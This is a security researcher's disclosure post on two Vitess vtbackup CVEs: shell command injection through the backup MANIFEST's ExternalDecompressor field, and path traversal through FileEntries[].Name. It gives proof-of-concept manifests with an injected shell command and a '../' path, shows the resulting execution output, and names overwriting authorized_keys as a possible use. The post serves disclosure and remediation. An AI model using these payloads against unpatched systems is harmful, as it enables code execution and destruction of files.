---
layout: post
category: Security
title: "RCE and arbitrary file write in Vitess vtbackup via untrusted MANIFEST fields"
heading: "RCE and arbitrary file write in Vitess vtbackup via untrusted MANIFEST fields"
description: "CVE-2026-27965 and CVE-2026-27969 - Vitess vtbackup trusted restore-time fields from the backup MANIFEST, allowing RCE via ExternalDecompressor and arbitrary path writes via FileEntries[].Name."
---

## TLDR:

- Two CVEs in Vitess. Both come from the backup `MANIFEST` file being trusted at
  restore time.
- **CVE-2026-27965** ([GHSA-8g8j-r87h-p36x](https://github.com/vitessio/vitess/security/advisories/GHSA-8g8j-r87h-p36x))
  - CVSS 8.4, CWE-78. The `ExternalDecompressor` field is run through
  `/bin/sh -c`. RCE as the `vitess` user.
- **CVE-2026-27969** ([GHSA-r492-hjgh-c9gw](https://github.com/vitessio/vitess/security/advisories/GHSA-r492-hjgh-c9gw))
  - CVSS 9.3, CWE-22. `FileEntries[].Name` path traversal. Write to any path
  the `vitess` user can write.
- **Affected:** v22.0.3 and older, v23.0.0-v23.0.2.
- **Patched:** v22.0.4, v23.0.3.
- Quick workaround for the RCE only: set `--external-decompressor=cat` or any
  other harmless command on `vttablet`/`vtbackup`. The flag overrides the
  manifest. No equivalent for the path traversal, upgrade.

## Background:

A Vitess backup is a directory containing a JSON `MANIFEST` and the data files
it references. Restore reads the manifest, copies the data files out, and
optionally decompresses them.

A normal one looks like this:

```json
{
    "BackupMethod": "builtin",
    "CompressionEngine": "external",
    "ExternalDecompressor": "zstd -d",
    "FileEntries": [{"Base":"Data","Name":"backup.sql.gz.external","Hash":"..."}],
    "Keyspace": "test",
    "Shard": "0",
    "SkipCompress": false
}
```

Two fields end up being the bugs:

- `ExternalDecompressor`, a shell command.
- `FileEntries[].Name`, a relative path.

Both are read from the manifest and used directly. If you can write to backup
storage, you can edit them.

The subtle bug here is that backup storage is treated like passive data, but the
`MANIFEST` is effectively restore-time control plane input. It selects commands,
paths, compression behaviour, and file layout. If the backup store is writable
by anything other than fully trusted restore operators, the manifest becomes an
execution surface.

## The Bugs:

### CVE-2026-27965: RCE via ExternalDecompressor

From `go/vt/mysqlctl/compression.go`:

```go
cmdArgs := []string{"-c", cmdStr}
cmd := exec.CommandContext(ctx, "/bin/sh", cmdArgs...)
```

`cmdStr` is the manifest field, verbatim. No allowlist, no validation.

PoC manifest:

```json
{
    "BackupMethod": "builtin",
    "CompressionEngine": "external",
    "ExternalDecompressor": "/bin/sh -c 'id > /tmp/PWNED; echo VITESS_RCE >> /tmp/PWNED'",
    "FileEntries": [{"Base":"Data","Name":"backup.sql.gz.external","Hash":""}],
    "Keyspace": "test",
    "Shard": "0",
    "SkipCompress": false
}
```

Run `vtbackup` against it:

```bash
vitess@d438d03b8595:/$ /vt/bin/vtbackup \
    --backup-storage-implementation=file \
    --file-backup-storage-root=/vt/backups \
    --init-keyspace=test --init-shard=0 \
    --topo-implementation=etcd2 \
    --topo-global-server-address=etcd:2379 \
    --topo-global-root=/vitess/global

... "msg":"Decompressing using external command: \"/bin/sh -c 'id > /tmp/PWNED; echo VITESS_RCE >> /tmp/PWNED'\""

vitess@d438d03b8595:/$ cat /tmp/PWNED
uid=999(vitess) gid=999(vitess) groups=999(vitess)
VITESS_RCE
```

As the `vitess` user, you are executing inside the tablet/container context.
Depending on deployment, that can mean access to database files, MySQL
credentials, topology-server connectivity, and the network the tablet sits on.

Multiple tablets restore from the same backup store, so one poisoned manifest
fans out across the cluster as new replicas come up.

The restore itself fails on a hash mismatch, but the decompressor runs *before*
the hash check. And because the engine retries failed file restores, the command
runs twice per attempt.

The thing worth flagging: I had no `--external-decompressor` flag set, no
`--compression-engine-name=external`, no compression flags at all. The default
compression engine is `pargzip`. The restore engine consults the flag first,
but if it is empty it falls back to whatever is in the manifest. The manifest
sets `CompressionEngine: "external"` and that is enough.

So the threat is not "an admin enabled this dangerous feature". It is "an admin
who has never heard of external compressors gets RCE'd by a manifest they did
not write."

The fix in [PR #19460](https://github.com/vitessio/vitess/pull/19460) makes the
manifest fallback opt-in via `--external-decompressor-allow-manifest`. Default
is to ignore the field.

### CVE-2026-27969: Path traversal via FileEntries[].Name

The restore engine joins `FileEntries[i].Name` onto the destination data dir
with no normalisation.

PoC manifest:

```json
{
    "BackupMethod": "builtin",
    "CompressionEngine": "",
    "SkipCompress": true,
    "FileEntries": [{
        "Base": "Data",
        "Name": "../../../../tmp/OhNo.txt",
        "Hash": ""
    }],
    "Keyspace": "test",
    "Shard": "0"
}
```

Same `vtbackup` invocation:

```bash
vitess@6d4bc6844b03:/$ ls /tmp/
OhNo.txt
```

The file got created at `/tmp/OhNo.txt`, outside the data directory, anywhere I
want. Contents are empty because I did not bother computing the right hash for
the source.

The detail that matters is from `go/os2/file.go`:

```go
func Create(name string) (*os.File, error) {
    return OpenFile(name, os.O_RDWR|os.O_CREATE|os.O_TRUNC, PermFile)
}
```

`O_TRUNC` happens before the hash check. So even with a wrong hash, the target
file gets created and truncated to zero bytes. Point a malicious manifest at
every config or auth file you can guess and you brick the box. If you do get
the hash right, you write whatever you want. `~/.ssh/authorized_keys` for the
`vitess` user is the classic.

There is no flag-based workaround for this one. The fix in
[PR #19470](https://github.com/vitessio/vitess/pull/19470) clamps the
destination to the data directory. Upgrade.

## Impact:

Both bugs are the same shape: backup manifest fields treated as trusted at
restore time. The `MANIFEST` lives in backup storage, which is a separate trust
boundary from the database server, but every field in it drives behaviour on
restore.

Once a string from the file reaches `exec.Command` or a path join, you have got
a CVE.

The practical impact is:

- RCE as the `vitess` user during restore.
- Arbitrary create/truncate of files the `vitess` user can write.
- Arbitrary file write if the attacker provides matching file contents and hash.
- Cluster fan-out if multiple tablets restore from the same poisoned backup
  store.

## Timeline:

- 20 Feb 2026: Reported RCE to `cncf-vitess-maintainers@lists.cncf.io`.
- 23 Feb 2026: Triage started.
- 24 Feb 2026: Fix for RCE drafted. Reported path traversal.
- 25 Feb 2026: Public bug [#19459](https://github.com/vitessio/vitess/issues/19459)
  opened. RCE advisory drafted.
- 26 Feb 2026: Path traversal advisory drafted. CVSS and CWE finalised.
- 27 Feb 2026: Both advisories published. v22.0.4 and v23.0.3 released.

## Wrap:

7 days from initial email to two published advisories with backports to v22 and
v23. Fast turnaround for a CNCF project and the Vitess maintainers deserve
credit for it.

The core lesson for me is that backup formats are not always just data. In this
case, the backup `MANIFEST` was restore-time control plane input, and treating
it as trusted turned backup storage write access into code execution and file
write primitives.

## Relevant Resources:

- [GHSA-8g8j-r87h-p36x: Vitess remote code execution via untrusted ExternalDecompressor](https://github.com/vitessio/vitess/security/advisories/GHSA-8g8j-r87h-p36x)
- [GHSA-r492-hjgh-c9gw: Vitess arbitrary file write via path traversal in backup MANIFEST](https://github.com/vitessio/vitess/security/advisories/GHSA-r492-hjgh-c9gw)
- [PR #19460: Do not trust manifest-supplied external decompressor by default](https://github.com/vitessio/vitess/pull/19460)
- [PR #19470: Clamp restore file paths to the destination data directory](https://github.com/vitessio/vitess/pull/19470)
- [Vitess backup and restore documentation](https://vitess.io/docs/22.0/user-guides/operating-vitess/backup-and-restore/overview/)
